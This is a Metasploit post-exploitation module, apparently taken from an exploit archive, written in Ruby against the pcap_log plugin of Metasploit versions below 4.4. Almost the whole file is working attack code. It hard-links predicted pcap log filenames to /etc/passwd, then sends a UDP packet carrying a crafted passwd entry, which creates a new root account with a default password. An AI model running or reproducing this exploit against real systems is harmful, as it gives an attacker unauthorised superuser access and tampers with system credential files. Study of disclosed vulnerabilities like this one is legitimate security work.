# Date: 16/7/2012 (public) 11/10/2012 (refined, submitted to EDB)
# Exploit Author: 0a29406d9794e4f9b30b3c5d6702c708
# Vendor Homepage: www.metasploit.com
# Software Link:
https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version
# Version: < 4.4
# Tested on: RHEL5
# CVE : BugtraqID 54472
 
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/file&#039;
require &#039;msf/core/post/linux/priv&#039;
require &#039;msf/core/exploit/local/linux_kernel&#039;
require &#039;msf/core/exploit/local/linux&#039;
require &#039;msf/core/exploit/local/unix&#039;
 
load &#039;lib/msf/core/post/common.rb&#039;
load &#039;lib/msf/core/post/file.rb&#039;
load &#039;lib/msf/core/exploit/local/unix.rb&#039;
load &#039;lib/msf/core/exploit/local/linux.rb&#039;
 
class Metasploit3 < Msf::Post
    Rank = ExcellentRanking
 
    include Msf::Post::File
    include Msf::Post::Common
 
    include Msf::Exploit::Local::Linux
    include Msf::Exploit::Local::Unix
 
    def initialize(info={})
        super( update_info( info, {
                &#039;Name&#039;    => &#039;Metasploit pcap_log Local Privilege Escalation&#039;,
                &#039;Description&#039;   => %q{
                    Metasploit < 4.4 contains a vulnerable &#039;pcap_log&#039; plugin which,
when used with the default settings,
exploits this by hard-linking these
                    filenames to /etc/passwd, then sending a packet with a priviliged
user entry contained within.
                    This, and all the other packets, are appended to /etc/passwd.
 
                    Successful exploitation results in the creation of a new superuser account.
 
                    This module requires manual clean-up - remove
/tmp/msf3-session*pcap files and truncate /etc/passwd.
                },
                &#039;License&#039;       => MSF_LICENSE,
                &#039;Author&#039;    => [ &#039;0a29406d9794e4f9b30b3c5d6702c708&#039;],
                &#039;Platform&#039;      => [ &#039;linux&#039;,&#039;unix&#039;,&#039;bsd&#039; ],
                &#039;References&#039;    =>
                    [
                        [ &#039;BID&#039;, &#039;54472&#039; ],
                        [ &#039;URL&#039;, &#039;http://0a29.blogspot.com/2012/07/0a29-12-2-metasploit-pcaplog-plugin.html&#039;],
                        [ &#039;URL&#039;, &#039;https://community.rapid7.com/docs/DOC-1946&#039; ],
                    ],
                &#039;DisclosureDate&#039; => "Jul 16 2012",
                &#039;Targets&#039;       =>
                    [
                        [ &#039;Linux/Unix Universal&#039;, {} ],
                    ],
                &#039;DefaultTarget&#039; => 0,
            }
            ))
            register_options(
            [  
                Opt::RPORT(2940),
                OptString.new("USERNAME", [ true, "Username for the new
superuser", "metasploit" ]),
                OptString.new("PASSWORD", [ true, "Password for the new
superuser", "metasploit" ])
            ], self)
    end
 
    def run
        print_status "Waiting for victim"
        initial_size = cmd_exec("cat /etc/passwd | wc -l")
        i = 0
        while(true) do
            if (i == 0)
                # 0a2940: cmd_exec is slow, so send 1 command to do all the links
                cmd_exec("for i in `seq 0 120` ; do ln /etc/passwd
/tmp/msf3-session_`date --date=\"\$i seconds\"
+%Y-%m-%d_%H-%M-%S`.pcap ; done")
            end
            if (cmd_exec("cat /etc/passwd | wc -l") != initial_size)
                # PCAP is flowing
                pkt = "\n\n" + datastore[&#039;USERNAME&#039;] + ":" +
datastore[&#039;PASSWORD&#039;].crypt("0a") + ":0:0:Metasploit Root
Account:/tmp:/bin/bash\n\n"
                print_status("Sending file contents payload to #{session.session_host}")
                udpsock = Rex::Socket::Udp.create(
                {
                    &#039;Context&#039; => {&#039;Msf&#039; => framework, &#039;MsfExploit&#039;=>self}
                })
                udpsock.sendto(pkt, session.session_host, datastore[&#039;RPORT&#039;])
                break
            end
            sleep(1) # wait a second
            i = (i+1) % 60 # increment second counter
        end
 
        if cmd_exec("(grep Metasploit /etc/passwd > /dev/null && echo true)
|| echo false").include?("true")
            print_good("Success. You should now be able to login or su to the
&#039;" + datastore[&#039;USERNAME&#039;] + "&#039; account")
        else
            print_error("Failed. You should manually verify the &#039;" +
datastore[&#039;USERNAME&#039;] + "&#039; user has not been added")
        end
        # 0a2940: Initially the plan was to have this post module switch
user, upload & execute a new payload
        #     However beceause the session is not a terminal, su will not
always allow this.
    end
end



